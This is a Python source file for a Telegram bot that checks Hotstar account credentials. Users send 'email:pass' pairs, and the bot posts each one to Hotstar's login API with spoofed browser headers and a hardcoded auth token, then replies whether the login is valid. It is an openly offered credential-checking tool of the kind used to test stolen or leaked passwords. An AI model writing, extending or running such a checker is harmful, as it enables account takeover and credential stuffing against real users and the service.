import requests
import json
import sys

from pyrogram import Client, filters
from pyrogram import __version__
from pyrogram.types import Message
import logging

api_id = int("API ID")
api_hash = "API HASH"
token = "BOT TOKEN"

# Env vars support soon....and will try to support multiple acc check after exams shit, kthnxbye

HotstarChecker = Client("HotstarCheckerBot", api_id, api_hash, bot_token=token)

logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
log = logging.getLogger(__name__).setLevel(logging.WARNING)
log.info("--------------------------------------")
log.info("|> Hotstar Checker Bot By @GodDrick <|")
log.info("--------------------------------------")
log.info("Pyro Version: " + __version__)

if sys.version_info[0] < 3 or sys.version_info[1] < 6:
    LOGGER.error("Use a python version of 3.6+... quitting!")
    quit(1)
    
    
@HotstarChecker.on_message(filters.private & filters.text & ~filters.command)
async def checker(bot: HotstarChecker, message: Message):
    try:
        omk = await message.reply(f"<b>{message.text}</b>\n\n<i>Checking.....</i>")
        fun = "."
        for l in range(5): # hehe fun, to look cool
            await omk.edit(f"<b>{message.text}</b>\n\n<i>Checking{fun}</i>")
            fun = fun+"."
        msg = message.text
        email, password = msg.split(":")
        url = 'https://api.hotstar.com/in/aadhar/v2/web/in/user/login'
        payload = {"isProfileRequired":"false","userData":{"deviceId":"a7d1bc04-f55e-4b16-80e8-d8fbf4c91768","password":password,"username":email,"usertype":"email"}}
        headers = {
            'content-type': 'application/json',
            'Referer': 'https://www.hotstar.com/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
            'Accept': '*/*',
            'hotstarauth': 'st=1542433344~exp=1542439344~acl=/*~hmac=7dd9deaf6fb16859bd90b1cc84b0d39e0c07b6bb2e174ffecd9cb070a25d9418',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'x-user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0 FKUA/website/41/website/Desktop'
            }
        await message.reply(email+":"+password)
        r = requests.post(url, data=json.dumps(payload), headers=headers)
        if (r.status_code==200):
            await message.reply(
                f"<b>The Hotstar Account is Valid✅\n\n{message.text}</b>\n\nLogin Successful!\n\n<b>Checked By: {message.from_user.mention}</b>\nWith love by @GodDrick <3",
            )
        else:
            await message.reply(
                f"<b>The Hotstar Account is Invalid❌</b>\n\n{message.text}\n\nLogin Unsuccessful :(\n\n<b>Checked By: {message.from_user.mention}</b>\nWith love by @GodDrick <3",
            )
    except:
        await message.reply("Something Went Wrong! Make sure you have put account in correct order, i.e, email:pass... retry again!")
        
        
# dont let others add bot to chat coz that will make the bot spam it and get rate limited.... uhmm and ntg else, you can edit accordingly        
@HotstarChecker.on_message(filters.chat & filters.new_chat_members)
async def welcome(bot: HotstarChecker, message: Message):
    joiner = await bot.get_me() 
    user_id = [user.id for user in message.new_chat_members]
    if int(joiner) == int(user_id):
        await message.reply_text("I am made to work only in PMs, so I am leaving this chat... see ya!")  
        await bot.leave_chat(message.chat.id, delete=True)
        
       
@HotstarChecker.on_message(filters.command("start"))
async def start(_, message: Message):      
    await message.reply("Hello, I am a simple hotstar checker bot created by @GodDrick! Type /help to get to know about my commands")
    
    
@HotstarChecker.on_message(filters.command("help"))
async def help(_, message: Message):      
    await message.reply("Just send me the email and password in the format email:pass and I will check it for you, thats it!")    
    

if __name__ == "__main__":
    HotstarChecker.start()    